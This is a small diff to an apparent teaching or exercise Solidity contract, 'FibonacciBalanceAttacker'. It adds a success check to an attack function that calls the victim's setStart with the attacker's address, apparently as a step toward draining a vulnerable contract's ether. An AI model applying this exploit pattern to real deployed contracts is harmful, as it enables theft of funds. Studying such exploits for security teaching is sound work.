@@ -15,6 +15,7 @@ contract FibonacciBalanceAttacker {
 
     function attack(address victim) public {
         // we call withdraw to send out ether
-        victim.call(bytes4(keccak256("setStart(uint256)")), uint256(address(this)));
+        bool success = victim.call(bytes4(keccak256("setStart(uint256)")), uint256(address(this)));
+        require(success);
     }
  }
